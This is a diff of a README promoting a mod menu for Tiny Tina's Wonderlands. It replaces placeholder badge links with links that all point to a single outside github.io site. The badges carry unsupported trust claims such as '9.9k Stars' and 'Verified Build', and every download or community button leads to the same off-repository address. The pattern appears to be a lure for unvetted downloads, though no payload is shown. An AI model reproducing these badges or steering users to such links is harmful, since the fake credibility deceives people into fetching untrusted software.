@@ -24,10 +24,10 @@ The Mod Menu acts as an **in-game customization hub**. With a single hotkey, you
 
 ---
 
-[![Activate Mods](https://img.shields.io/badge/Activate-Mods-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 9.9k Stars](https://img.shields.io/badge/Community-9.9k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download Menu](https://img.shields.io/badge/Download-Now-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Mods](https://img.shields.io/badge/Activate-Mods-red?logo=rocket\&style=for-the-badge)](https://wonderlands-mod-menu.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://wonderlands-mod-menu.github.io/.github/)
+[![⭐️ 9.9k Stars](https://img.shields.io/badge/Community-9.9k_Stars-green?logo=github\&style=for-the-badge)](https://wonderlands-mod-menu.github.io/.github/)
+[![Download Menu](https://img.shields.io/badge/Download-Now-brightgreen?logo=github\&style=for-the-badge)](https://wonderlands-mod-menu.github.io/.github/)
 
 ---
 
@@ -164,8 +164,8 @@ A: Yes, profiles allow instant hot-swapping.
 
 The **Tiny Tina’s Wonderlands Mod Menu** gives you **control over loot farming, combat, and visual tweaks** in a clean overlay. Whether you’re chasing legendary gear, breezing through the story, or experimenting with spell builds, this menu lets you shape the game to your liking.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download Mods](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://wonderlands-mod-menu.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://wonderlands-mod-menu.github.io/.github/)
+[![Download Mods](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://wonderlands-mod-menu.github.io/.github/)
 
 ---
